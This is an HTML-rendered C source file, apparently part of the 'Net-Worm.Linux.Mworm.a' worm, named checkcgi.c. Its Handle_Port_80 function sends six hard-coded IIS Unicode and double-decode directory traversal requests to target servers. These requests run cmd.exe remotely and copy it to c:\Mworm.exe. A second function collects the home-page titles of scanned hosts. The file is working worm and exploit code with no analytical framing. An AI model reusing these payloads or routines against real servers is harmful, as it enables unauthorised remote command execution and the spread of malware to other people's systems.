<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Net-Worm.Linux.Mworm.a - checkcgi.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">//Check the CGI Hole
//part of Mworm
//Based on Mscan
//CheckCGI.c
</span><span class="sc0">
</span><span class="sc9">#include "common.h"
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Handle_Port_80</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">hostip</span><span class="sc10">,</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">iptr</span><span class="sc10">)</span><span class="sc0">   </span><span class="sc2">//Handle WEB Scan
</span><span class="sc10">{</span><span class="sc0">
    
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">string_hole</span><span class="sc10">[</span><span class="sc11">CHECK_COUNT_S</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> 
     </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc6">"GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+copy%20c:\\winnt\\system32\\cmd.exe%20c:\\Mworm.exe HTTP/1.0\r\n\r\n"</span><span class="sc10">,</span><span class="sc0">
      </span><span class="sc6">"GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+copy%20c:\\winnt\\system32\\cmd.exe%20c:\\Mworm.exe HTTP/1.0\r\n\r\n"</span><span class="sc10">,</span><span class="sc0">
      </span><span class="sc6">"GET /msadc/..%c1%9c../..%c1%9c../..%c1%9c../winnt/system32/cmd.exe?/c+copy%20c:\\winnt\\system32\\cmd.exe%20c:\\Mworm.exe HTTP/1.0\r\n\r\n"</span><span class="sc10">,</span><span class="sc0">
      </span><span class="sc6">"GET /msadc/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+copy%20c:\\winnt\\system32\\cmd.exe%20c:\\Mworm.exe HTTP/1.0\r\n\r\n"</span><span class="sc10">,</span><span class="sc0">
      </span><span class="sc6">"GET /scripts/..%255c../winnt/system32/cmd.exe?/c+copy%20c:\\winnt\\system32\\cmd.exe%20c:\\Mworm.exe HTTP/1.0\r\n\r\n"</span><span class="sc10">,</span><span class="sc0">
      </span><span class="sc6">"GET /msadc/..%255c../..%255c../winnt/system32/cmd.exe?/c+copy%20c:\\winnt\\system32\\cmd.exe%20c:\\Mworm.exe HTTP/1.0\r\n\r\n"</span><span class="sc0">
     </span><span class="sc10">};</span><span class="sc0">
     
     
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Hole_TypeCount</span><span class="sc0"> </span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">search</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"HTTP/1.1 200"</span><span class="sc10">;</span><span class="sc0"> 
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">other1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"HTTP/1.1 500 13"</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">serv_string</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
     </span><span class="sc11">ssize_t</span><span class="sc0"> </span><span class="sc11">tmpResult</span><span class="sc10">;</span><span class="sc0">
     

     </span><span class="sc11">Hole_TypeCount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">;</span><span class="sc0">
     
     </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">Hole_TypeCount</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">writeable_timeo</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">WEB_WRITETIMEOUT</span><span class="sc10">)&lt;=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">tmpResult</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">writen</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">string_hole</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">string_hole</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]));</span><span class="sc0"> 
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmpResult</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fd</span><span class="sc10">=</span><span class="sc11">TCP_NB_connect</span><span class="sc10">(</span><span class="sc11">iptr</span><span class="sc10">-&gt;</span><span class="sc11">h_network</span><span class="sc10">,</span><span class="sc11">iptr</span><span class="sc10">-&gt;</span><span class="sc11">h_port</span><span class="sc10">,</span><span class="sc11">CONNECT_TIME</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc10">}</span><span class="sc0">
         
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">Get_IIS_Title</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">hostip</span><span class="sc10">)</span><span class="sc0">                </span><span class="sc2">//Get the Host IIS first page Title
</span><span class="sc10">{</span><span class="sc0">
    
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">string_head</span><span class="sc10">=</span><span class="sc6">"GET / HTTP/1.0\r\n\r\n"</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">search_head_B</span><span class="sc10">=</span><span class="sc6">"&lt;TITLE&gt;"</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">search_head_E</span><span class="sc10">=</span><span class="sc6">"&lt;/TITLE&gt;"</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">Dont_Display1</span><span class="sc10">=</span><span class="sc6">"Test Page for"</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">Dont_Display2</span><span class="sc10">=</span><span class="sc6">"Authorization Required"</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">search</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"HTTP/1.1 200"</span><span class="sc10">;</span><span class="sc0"> 
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">tmpStr</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">Head_Str</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">serv_string</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Have_Get_200</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">ssize_t</span><span class="sc0"> </span><span class="sc11">tmpResult</span><span class="sc10">;</span><span class="sc0">
     
     </span><span class="sc11">Have_Get_200</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">writeable_timeo</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">WEB_WRITETIMEOUT</span><span class="sc10">)&lt;=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc11">tmpResult</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">writen</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">string_head</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">string_head</span><span class="sc10">));</span><span class="sc0">
     </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">;){</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">readable_timeo</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">WEB_READTIMEOUT</span><span class="sc10">)&lt;=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">tmpResult</span><span class="sc10">=</span><span class="sc11">readline</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">serv_string</span><span class="sc10">,</span><span class="sc4">1024</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmpResult</span><span class="sc10">&lt;=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc2">//      serv_string[tmpResult]=0;
//      printf("%s",serv_string);
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HTStrCaseStr</span><span class="sc10">(</span><span class="sc11">serv_string</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">search</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">Have_Get_200</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        
        
        </span><span class="sc11">Head_Str</span><span class="sc10">=</span><span class="sc11">Get_Range_Str</span><span class="sc10">(</span><span class="sc11">serv_string</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">search_head_B</span><span class="sc0"> </span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">search_head_E</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Head_Str</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">Have_Get_200</span><span class="sc10">==</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HTStrCaseStr</span><span class="sc10">(</span><span class="sc11">Head_Str</span><span class="sc10">,</span><span class="sc11">Dont_Display1</span><span class="sc10">)==</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
               </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HTStrCaseStr</span><span class="sc10">(</span><span class="sc11">Head_Str</span><span class="sc10">,</span><span class="sc11">Dont_Display2</span><span class="sc10">)==</span><span class="sc5">NULL</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Host %s: %s\n"</span><span class="sc10">,</span><span class="sc11">hostip</span><span class="sc10">,</span><span class="sc11">Head_Str</span><span class="sc10">);</span><span class="sc0">
            
            </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc11">Head_Str</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        
    </span><span class="sc10">}</span><span class="sc0">     
     </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span></div></body>
</html>
